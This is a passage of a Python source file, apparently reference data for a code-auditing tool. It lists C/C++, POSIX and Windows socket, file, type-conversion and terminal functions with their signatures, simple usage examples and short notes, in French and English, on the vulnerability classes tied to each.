    'accept': 'int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) [----] ex: accept(serverSock, NULL, NULL) -> accepte une connexion entrante [----] Vulns/Infos 1 : L\'acceptation de connexions non vérifiées peut mener à des attaques de type DoS [----] Vulns/Infos 2 : Ne pas valider correctement l\'adresse source peut permettre une usurpation d\'identité',

    'send': 'ssize_t send(int sockfd, const void *buf, size_t len, int flags) [----] ex: send(socket, message, strlen(message), 0) -> envoie des données sur un socket [----] Vulns/Infos 1 : L\'envoi de données non cryptées peut exposer les informations à des attaques [----] Vulns/Infos 2 : L\'envoi de données malformées peut causer des erreurs de protocole',

    'recv': 'ssize_t recv(int sockfd, void *buf, size_t len, int flags) [----] ex: recv(socket, buffer, sizeof(buffer), 0) -> reçoit des données sur un socket [----] Vulns/Infos 1 : La réception de données non sécurisées peut permettre des attaques par injection ou de type MITM',

    'getpid': 'pid_t getpid(void) [----] ex: getpid() -> récupère l\'identifiant du processus [----] Vulns/Infos 1 : L\'exposition de l\'ID du processus peut aider un attaquant à cibler des processus spécifiques',

    'getppid': 'pid_t getppid(void) [----] ex: getppid() -> récupère l\'identifiant du processus parent [----] Vulns/Infos 1 : Exposer l\'ID du processus parent peut aider un attaquant à remonter la chaîne des processus',

    'chmod': 'int chmod(const char *pathname, mode_t mode) [----] ex: chmod("file.txt", 0644) -> change les permissions d\'un fichier [----] Vulns/Infos 1 : Modifier les permissions d\'un fichier de manière incorrecte peut exposer des fichiers sensibles',

    'chown': 'int chown(const char *pathname, uid_t owner, gid_t group) [----] ex: chown("file.txt", 1000, 1000) -> change le propriétaire d\'un fichier [----] Vulns/Infos 1 : Une mauvaise gestion des propriétaires de fichiers peut entraîner un accès non autorisé',

    'stat': 'int stat(const char *pathname, struct stat *statbuf) [----] ex: stat("file.txt", &fileStat) -> récupère les informations sur un fichier [----] Vulns/Infos 1 : Les informations récupérées peuvent exposer la structure du système de fichiers à des attaquants',

    'fstat': 'int fstat(int fd, struct stat *statbuf) [----] ex: fstat(fileDescriptor, &fileStat) -> récupère les informations sur un fichier ouvert [----] Vulns/Infos 1 : Les informations récupérées peuvent exposer les métadonnées d\'un fichier à des attaques',

    'lstat': 'int lstat(const char *pathname, struct stat *statbuf) [----] ex: lstat("symlink", &symlinkStat) -> récupère les informations sur un lien symbolique [----] Vulns/Infos 1 : Exposer des informations de liens symboliques peut permettre des attaques d\'escalade de privilèges',

    'mmap': 'void* mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) [----] ex: mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0) -> mappe un fichier ou un périphérique en mémoire [----] Vulns/Infos 1 : Une mauvaise gestion de la mémoire mappée peut entraîner des fuites de mémoire ou des dépassements de tampon',

    'munmap': 'int munmap(void *addr, size_t length) [----] ex: munmap(mappedMemory, 4096) -> démappe un fichier ou un périphérique de la mémoire [----] Vulns/Infos 1 : Ne pas démappé correctement peut entraîner des fuites de mémoire',

    'ioctl': 'int ioctl(int fd, unsigned long request, ...) [----] ex: ioctl(deviceFd, IOCTL_CMD, data) -> contrôle un périphérique [----] Vulns/Infos 1 : L\'utilisation incorrecte d\'ioctl peut endommager un périphérique ou permettre l\'exécution de commandes non autorisées',

    'fcntl': 'int fcntl(int fd, int cmd, ...) [----] ex: fcntl(fileDescriptor, F_SETFL, O_NONBLOCK) -> manipule un descripteur de fichier [----] Vulns/Infos 1 : Des erreurs dans la manipulation des descripteurs de fichier peuvent causer des accès non autorisés',

    'select': 'int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout) [----] ex: select(0, &readfds, NULL, NULL, NULL) -> surveille plusieurs descripteurs de fichiers [----] Vulns/Infos 1 : Une gestion incorrecte des descripteurs peut causer des blocages ou des fuites de ressources',

    'poll': 'int poll(struct pollfd *fds, nfds_t nfds, int timeout) [----] ex: poll(&fds, 1, 1000) -> surveille plusieurs descripteurs de fichiers [----] Vulns/Infos 1 : La gestion incorrecte de plusieurs descripteurs peut entraîner des attaques par déni de service',

    'epoll': 'int epoll_create(int size) [----] ex: epoll_create(10) -> surveille plusieurs descripteurs de fichiers [----] Vulns/Infos 1 : Un épuisement des ressources systèmes peut être provoqué si l\'epoll est mal configuré',

    'dup': 'int dup(int oldfd) [----] ex: dup(oldFileDescriptor) -> duplique un descripteur de fichier [----] Vulns/Infos 1 : Dupliquer un descripteur de fichier sans vérification peut entraîner des erreurs d\'accès aux ressources',

    'dup2': 'int dup2(int oldfd, int newfd) [----] ex: dup2(oldFileDescriptor, newFileDescriptor) -> duplique un descripteur de fichier vers un autre descripteur [----] Vulns/Infos 1 : Les duplications incorrectes peuvent exposer des fichiers à un accès non sécurisé'
}
all_type_conversion_functions = { #FAIT
    'nom_du_dictionnaire': 'Fonctions de conversion de type',
    'atoi': 'Convertit une chaîne en entier (int). Non sécurisé (C)',
    'atol': 'Convertit une chaîne en long (long int). Non sécurisé (C)',
    'atof': 'Convertit une chaîne en flottant (double). Non sécurisé (C)',
    'strtol': 'Convertit une chaîne en long avec gestion d\'erreur (C)',
    'strtoul': 'Convertit une chaîne en unsigned long (C)',
    'strtod': 'Convertit une chaîne en double avec gestion d\'erreur (C)',
    'itoa': 'Convertit un entier en chaîne (non standard, extension commune)',
    'sprintf': 'Formate des données en chaîne (risque de buffer overflow)',
    'snprintf': 'Formate des données en chaîne de manière sécurisée (C99)',
    'static_cast': 'Conversion explicite de type à la compilation (C++)',
    'dynamic_cast': 'Conversion sécurisée avec vérification RTTI (C++)',
    'reinterpret_cast': 'Conversion brute de type (risquée, C++)',
    'const_cast': 'Retire ou ajoute la qualification "const" (C++)',
    'std::stoi': 'Convertit une chaîne en int (C++11, gestion d\'erreur)',
    'std::stod': 'Convertit une chaîne en double (C++11)',
    'WideCharToMultiByte': 'Convertit une chaîne UTF-16 en ANSI/UTF-8 (Windows)',
    'MultiByteToWideChar': 'Convertit une chaîne ANSI/UTF-8 en UTF-16 (Windows)',
    '_itoa_s': 'Convertit un entier en chaîne (sécurisé, Windows CRT)',
    '_wtoi': 'Convertit une chaîne large (wchar_t) en entier (Windows)',
    'VarI4FromStr': 'Convertit une chaîne en entier 32-bit (COM/Windows)',
    'VariantChangeType': 'Conversion de type générique (COM/Windows)',
    'iconv': 'Convertit entre encodages de caractères (POSIX)',
    'wcstombs': 'Convertit une chaîne large en chaîne multi-octets (POSIX)',
    'mbstowcs': 'Convertit une chaîne multi-octets en chaîne large (POSIX)',
    'std::to_string': 'Convertit un nombre en chaîne (C++11)',
    'std::from_chars': 'Convertit une chaîne en nombre sans allocations (C++17)',
    'boost::lexical_cast': 'Conversion générique avec gestion d\'erreur (Boost)',
    'QString::toInt': 'Convertit une QString en entier (Qt Framework)',
    '(int)': 'Cast explicite en int (C/C++, non sécurisé)',
    'bit_cast': 'Conversion binaire de type (C++20, préservant les bits)',
    'union': 'Technique de réinterprétation de type via union (C/C++)',
}

all_type_conversion_functions_infos = {
    'nom_du_dictionnaire': '[color=red]Fonctions de conversion de type identifiées[/color]',
    
    'atoi': (
        '[color=blue][code]int atoi(const char *str);[/code][/color]\n'
        '[code]int num = atoi("1234");[/code]\n'
        '[color=red]• No error checking (returns 0 on failure)\n• Undefined behavior on overflow\n• Security critical in input validation[/color]'
    ),
    
    'strtol': (
        '[color=blue][code]long strtol(const char *str, char **endptr, int base);[/code][/color]\n'
        '[code]char *end; long val = strtol("0x1a3", &end, 16);[/code]\n'
        '[color=red]• Improper endptr validation\n• Base autodetection confusion\n• ERANGE error handling bypass[/color]'
    ),

    'sprintf': (
        '[color=blue][code]int sprintf(char *str, const char *format, ...);[/code][/color]\n'
        '[code]sprintf(buffer, "Value: %d", num);[/code]\n'
        '[color=red]• Buffer overflow via format specifiers\n• Format string vulnerabilities\n• Uncontrolled width/precision[/color]'
    ),

    'reinterpret_cast': (
        '[color=blue][code]T reinterpret_cast<U>(expression); // C++[/code][/color]\n'
        '[code]int *ip = reinterpret_cast<int*>(0xDEADBEEF);[/code]\n'
        '[color=red]• Type punning violating strict aliasing\n• Pointer truncation in 32/64-bit\n• Undefined behavior via invalid casts[/color]'
    ),

    'std::from_chars': (
        '[color=blue][code]std::from_chars_result from_chars(const char* first, const char* last, TYPE& value, int base = 10);[/code][/color]\n'
        '[code]auto res = std::from_chars(str.data(), str.data()+len, value);[/code]\n'
        '[color=red]• Unchecked ec/ptr results\n• Locale-independent number parsing\n• No support for floating-point in C++17[/color]'
    ),

    'WideCharToMultiByte': (
        '[color=blue][code]int WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);[/code][/color]\n'
        '[code]WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buffer, size, NULL, NULL);[/code]\n'
        '[color=red]• Buffer size miscalculation\n• Invalid Unicode code points\n• Default char substitution attacks[/color]'
    ),

    'iconv': (
        '[color=blue][code]size_t iconv(iconv_t cd, char **inbuf, size_t *inbytesleft, char **outbuf, size_t *outbytesleft);[/code][/color]\n'
        '[code]iconv(cd, &input, &inlen, &output, &outlen);[/code]\n'
        '[color=red]• Incomplete byte sequences\n• Stateful encoding handling\n• Multithreaded context safety[/color]'
    ),

    'dynamic_cast': (
        '[color=blue][code]dynamic_cast<T>(expression); // C++[/code][/color]\n'
        '[code]Derived* d = dynamic_cast<Derived*>(base);[/code]\n'
        '[color=red]• RTTI overhead in performance-critical code\n• Cross-cast failures\n• Null dereference potential[/color]'
    ),

    'bit_cast': (
        '[color=blue][code]template<typename To, typename From> constexpr To bit_cast(const From& from) noexcept; // C++20[/code][/color]\n'
        '[code]float f = bit_cast<float>(0x40490fdb);[/code]\n'
        '[color=red]• Type size mismatch UB\n• Non-trivially-copyable types\n• Endianness portability issues[/color]'
    ),

    'QString::toInt': (
        '[color=blue][code]int QString::toInt(bool *ok = nullptr, int base = 10) const; // Qt[/code][/color]\n'
        '[code]bool ok; int val = str.toInt(&ok, 16);[/code]\n'
        '[color=red]• Locale-aware number parsing\n• Ignored ok parameter risks\n• Base autodetection quirks[/color]'
    ),

    '_itoa_s': (
        '[color=blue][code]errno_t _itoa_s(int value, char *buffer, size_t size, int radix); // Windows[/code][/color]\n'
        '[code]_itoa_s(255, buf, sizeof(buf), 16); // "ff"[/code]\n'
        '[color=red]• Incorrect size parameter\n• Invalid radix values\n• Non-standard CRT dependency[/color]'
    ),

    'std::stod': (
        '[color=blue][code]double stod(const std::string& str, size_t *idx = 0); // C++11[/code][/color]\n'
        '[code]double d = std::stod("3.1415e2");[/code]\n'
        '[color=red]• Locale-dependent decimal points\n• Exceptions in noexcept contexts\n• NaN/Infinity parsing ambiguity[/color]'
    ),

    'union': (
        '[color=blue][code]union { T1 member1; T2 member2; }; // C/C++[/code][/color]\n'
        '[code]union { uint32_t i; float f; } u; u.i = 0x40490FDB;[/code]\n'
        '[color=red]• Strict aliasing rule violations\n• Padding byte inconsistencies\n• Endianness assumptions[/color]'
    ),

    'VarI4FromStr': (
        '[color=blue][code]HRESULT VarI4FromStr(LPOLESTR strIn, LCID lcid, ULONG dwFlags, LONG *plOut); // Windows COM[/code][/color]\n'
        '[code]VarI4FromStr(L"1234", LOCALE_SYSTEM_DEFAULT, 0, &lVal);[/code]\n'
        '[color=red]• BSTR memory leak potential\n• LOCALE mismatches\n• 64-bit truncation[/color]'
    ),

    'mbstowcs': (
        '[color=blue][code]size_t mbstowcs(wchar_t *dest, const char *src, size_t max); // POSIX[/code][/color]\n'
        '[code]mbstowcs(wbuffer, "test", 5);[/code]\n'
        '[color=red]• Encoding conversion errors\n• Surrogate pair handling\n• Max count miscalculations[/color]'
    ),

    'const_cast': (
        '[color=blue][code]const_cast<T>(expression); // C++[/code][/color]\n'
        '[code]modify(const_cast<char*>(read_only_str));[/code]\n'
        '[color=red]• Write to read-only memory UB\n• Dangling pointers from temporary objects\n• Thread safety violations[/color]'
    )
}

all_terminal_functions = {
    'nom_du_dictionnaire': 'Fonctions de terminal',
    'tcgetattr': 'Récupère les attributs du terminal (termios)',
    'tcsetattr': 'Modifie les attributs du terminal (ex: mode raw)',
    'cfmakeraw': 'Désactive l\'écho, le contrôle par signaux, etc.',
    'ttyname': 'Retourne le nom du terminal associé à un descripteur',
    'isatty': 'Vérifie si un descripteur est un terminal',
    'ioctl(TIOCGWINSZ)': 'Récupère la taille du terminal (lignes, colonnes)',
    'putchar': 'Écrit un caractère sur stdout (libc, utilise write en interne)',
    'puts': 'Écrit une chaîne suivie d\'un saut de ligne (libc)',
    'tputs': 'Émet des séquences de contrôle terminal (ex: couleurs, curseur)',
    'signal(SIGWINCH)': 'Gère le redimensionnement du terminal',
    'setupterm': 'Initialise la base de données terminfo',
    'tgetent': 'Charge les capacités du terminal depuis termcap',
    'tgoto': 'Génère des séquences de déplacement du curseur',
    'GetConsoleMode': 'Récupère le mode de la console (echo, input, etc.)',
    'SetConsoleMode': 'Active/Désactive le mode raw ou ligne',
    'GetConsoleScreenBufferInfo': 'Récupère la taille du tampon et la position du curseur',
    'SetConsoleCursorPosition': 'Contrôle la position du curseur',
    'WriteConsole': 'Écrit du texte formaté dans la console (UTF-16)',
    'WriteConsoleOutputCharacter': 'Écrit des caractères à une position spécifique',
    'SetConsoleTextAttribute': 'Change la couleur du texte et du fond',
    'FillConsoleOutputAttribute': 'Remplit une zone avec des attributs de couleur',
    'FillConsoleOutputCharacter': 'Remplit une zone avec un caractère',
}
all_terminal_functions_infos = {
    'nom_du_dictionnaire': '[color=red]Fonctions de terminal identifiées[/color]',
    
    'tcgetattr': (
        '[color=blue][code]int tcgetattr(int fd, struct termios *termios_p);[/code][/color]\n'
        '[code]struct termios t; tcgetattr(STDIN_FILENO, &t);[/code]\n'
        '[color=red]• Memory corruption via invalid fd\n• Race condition in attr retrieval\n• Kernel struct disclosure[/color]'
    ),
    
    'tcsetattr': (
        '[color=blue][code]int tcsetattr(int fd, int optional_actions, const struct termios *termios_p);[/code][/color]\n'
        '[code]tcsetattr(0, TCSANOW, &new_termios);[/code]\n'
        '[color=red]• Terminal state hijacking\n• Signal handler interference\n• TTY injection attacks[/color]'
    ),

    'ioctl(TIOCGWINSZ)': (
        '[color=blue][code]int ioctl(int fd, unsigned long request, struct winsize *ws);[/code][/color]\n'
        '[code]struct winsize w; ioctl(0, TIOCGWINSZ, &w);[/code]\n'
        '[color=red]• Kernel memory disclosure via uninit struct\n• Buffer overflow in legacy impl\n• Terminal resize races[/color]'
    ),

    'WriteConsole': (
        '[color=blue][code]BOOL WriteConsole(HANDLE hConsoleOutput, const VOID *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);[/code][/color]\n'
        '[code]WriteConsole(hConsole, L"Hello", 5, NULL, NULL);[/code]\n'
        '[color=red]• Console handle privilege escalation\n• UTF-16 surrogate pair bypass\n• Buffer truncation info leak[/color]'
    ),

    'SetConsoleTextAttribute': (
        '[color=blue][code]BOOL SetConsoleTextAttribute(HANDLE hConsoleOutput, WORD wAttributes);[/code][/color]\n'
        '[code]SetConsoleTextAttribute(hConsole, FOREGROUND_RED);[/code]\n'
        '[color=red]• Attribute persistence attacks\n• ANSI escape sequence confusion\n• Color-based side channels[/color]'
    ),

    'tputs': (
        '[color=blue][code]int tputs(const char *str, int affcnt, int (*putc)(int));[/code][/color]\n'
        '[code]tputs(tigetstr("cup"), 1, putchar);[/code]\n'
        '[color=red]• Escape sequence injection (OS command)\n• Terminal capability confusion\n• Stack overflow in putc callback[/color]'
    ),

    'signal(SIGWINCH)': (
        '[color=blue][code]void (*signal(int sig, void (*func)(int)))(int);[/code][/color]\n'
        '[code]signal(SIGWINCH, handle_resize);[/code]\n'
        '[color=red]• Signal handler race conditions\n• Async-signal-unsafe functions\n• Reentrancy vulnerabilities[/color]'
    ),

    'SetConsoleMode': (
        '[color=blue][code]BOOL SetConsoleMode(HANDLE hConsoleHandle, DWORD dwMode);[/code][/color]\n'
        '[code]SetConsoleMode(hStdin, ENABLE_VIRTUAL_TERMINAL_PROCESSING);[/code]\n'
        '[color=red]• VT100 emulation bypass\n• Input validation bypass\n• Console mode downgrade attacks[/color]'
    ),

    'FillConsoleOutputCharacter': (
        '[color=blue][code]BOOL FillConsoleOutputCharacter(HANDLE hConsoleOutput, TCHAR cCharacter, DWORD nLength, COORD dwWriteCoord, LPDWORD lpNumberOfCharsWritten);[/code][/color]\n'
        '[code]FillConsoleOutputCharacter(hConsole, ' ', 80*25, (COORD){0,0}, &written);[/code]\n'
        '[color=red]• Screen buffer overflow\n• NULL character injection\n• Console memory corruption[/color]'
    ),

    'isatty': (
        '[color=blue][code]int isatty(int fd);[/code][/color]\n'
        '[code]if(!isatty(0)) exit(1);[/code]\n'
        '[color=red]• TTY check bypass via file redirection\n• Privilege escalation via fd reuse\n• Container detection bypass[/color]'
    ),

    'setupterm': (
        '[color=blue][code]int setupterm(char *term, int fildes, int *errret);[/code][/color]\n'
        '[code]setupterm(NULL, 1, NULL);[/code]\n'
        '[color=red]• TERM environment poisoning\n• Terminfo path traversal\n• Buffer overflow in legacy termcaps[/color]'
    ),

    'WriteConsoleOutputCharacter': (
        '[color=blue][code]BOOL WriteConsoleOutputCharacter(HANDLE hConsoleOutput, LPCSTR lpCharacter, DWORD nLength, COORD dwWriteCoord, LPDWORD lpNumberOfCharsWritten);[/code][/color]\n'
        '[code]WriteConsoleOutputCharacter(hConsole, "DANGER", 6, (COORD){10,5}, &written);[/code]\n'
        '[color=red]• Out-of-bound console writes\n• ANSI escape code injection\n• Multi-byte char truncation[/color]'
    ),

    'cfmakeraw': (
        '[color=blue][code]void cfmakeraw(struct termios *termios_p);[/code][/color]\n'
        '[code]cfmakeraw(&term);[/code]\n'
        '[color=red]• Signal interception bypass\n• Raw mode persistence attacks\n• TTY input desynchronization[/color]'
    ),

    'tgetent': (
        '[color=blue][code]int tgetent(char *bp, const char *name);[/code][/color]\n'
        '[code]tgetent(NULL, "xterm-256color");[/code]\n'
        '[color=red]• Termcap database poisoning\n• Buffer overflow in legacy impl\n• Environment variable injection[/color]'
    )
}
